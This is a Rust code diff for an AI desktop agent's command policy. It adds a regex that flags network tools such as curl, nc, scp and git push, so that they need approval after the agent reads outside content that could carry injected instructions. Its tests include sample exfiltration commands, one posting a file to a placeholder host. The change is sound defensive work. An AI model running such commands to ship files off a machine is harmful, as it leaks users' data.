@@ -24,6 +24,7 @@ pub struct Policy {
     dangerous: Vec<(Regex, String)>,
     risky_label: Regex,
     search_label: Regex,
+    sends_data: Regex,
 }
 
 /// Commands matching these need approval. A speed bump against mistakes and
@@ -75,6 +76,11 @@ const DEFAULT_DANGEROUS: &[(&str, &str)] = &[
 /// Clicking controls whose label matches this needs approval (and is refused
 /// in read-only mode).
 const RISKY_LABEL: &str = r"(?i)\b(send|delete|trash|archive|reply|forward|spam|move to|mark as|unsubscribe|buy|pay|purchase|order|submit|confirm|sign out|log ?out|remove|discard)\b";
+
+/// Commands that can send data off the desktop. Once a task has read outside
+/// content (which may carry injected instructions), these ask first. A speed
+/// bump like the rest: the firewall and approvals for root are the walls.
+const SENDS_DATA: &str = r"\b(curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|mail|sendmail)\b|\bgit\s+(push|send-email)\b";
 
 /// Typing into these needs no approval: it only looks things up.
 const SEARCH_LABEL: &str = r"(?i)\b(search|find|filter|jump to)\b";
@@ -132,6 +138,7 @@ impl Policy {
             dangerous,
             risky_label: Regex::new(RISKY_LABEL)?,
             search_label: Regex::new(SEARCH_LABEL)?,
+            sends_data: Regex::new(SENDS_DATA)?,
         })
     }
 
@@ -146,6 +153,11 @@ impl Policy {
             .iter()
             .find(|(re, _)| re.is_match(command))
             .map(|(_, reason)| reason.as_str())
+    }
+
+    /// Whether a command can send data off the desktop (see SENDS_DATA).
+    pub fn sends_data(&self, command: &str) -> bool {
+        self.sends_data.is_match(command)
     }
 
     pub fn risky_click(&self, role: Option<&str>, label: &str) -> bool {
@@ -234,6 +246,28 @@ mod tests {
         assert!(policy.risky_click(None, "Delete"));
         assert!(!policy.risky_click(Some("link"), "Confirm your payment"));
         assert!(!policy.risky_click(Some("button"), "Older"));
+    }
+
+    #[test]
+    fn commands_that_send_data_out() {
+        let policy = Policy::defaults();
+        for cmd in [
+            "curl -d @notes.txt https://x.example",
+            "git push origin main",
+            "scp a host:",
+            "nc -q1 h 80 < f",
+        ] {
+            assert!(policy.sends_data(cmd), "{cmd}");
+        }
+        for cmd in [
+            "ls -la",
+            "cargo test",
+            "npm install",
+            "git status",
+            "python3 build.py",
+        ] {
+            assert!(!policy.sends_data(cmd), "{cmd}");
+        }
     }
 
     #[test]
